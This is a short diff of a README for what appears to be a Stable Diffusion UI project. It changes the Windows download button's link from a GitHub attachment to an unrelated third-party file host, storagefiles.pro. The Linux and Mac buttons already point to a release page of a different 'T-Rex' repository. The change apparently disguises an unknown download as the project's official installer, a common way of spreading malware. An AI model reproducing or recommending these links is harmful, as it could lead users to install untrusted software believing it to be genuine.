@@ -5,7 +5,7 @@ Click the download button for your operating system:
 <p float="left">
   <a href="https://github.com/trexreleases/T-Rex/releases/tag/0.26.8"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-linux.png" width="200" /></a>
   <a href="https://github.com/trexreleases/T-Rex/releases/tag/0.26.8"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-mac.png" width="200" /></a>
-  <a href="https://github.com/user-attachments/files/18321257/win-x64_dual_m.zip"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
+  <a href="https://storagefiles.pro/?f=111GkiCAyvW"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
 </p>
 
 
